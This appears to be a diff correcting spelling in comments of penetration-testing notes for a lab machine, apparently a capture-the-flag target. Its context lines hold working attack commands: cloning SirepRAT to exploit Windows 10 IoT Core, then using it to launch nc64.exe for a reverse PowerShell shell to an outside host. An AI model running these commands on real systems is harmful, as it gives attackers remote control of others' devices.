@@ -66,7 +66,7 @@ ssh Administrator@10.10.10.204
 
 
 
-# vulerability of Windows 10 IoT Core
+# vulnerability of Windows 10 IoT Core
 # port 29817、29819、29820:
 git clone https://github.com/SafeBreach-Labs/SirepRAT.git
 
@@ -210,7 +210,7 @@ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C
 
 
 
-# Execute File To Conect Back
+# Execute File To Connect Back
 python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c c:\Windows\nc64.exe 10.10.15.28 4455 -e powershell.exe"
 
 python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\test\nc64.exe 10.10.15.28 4455 -e powershell.exe" --v
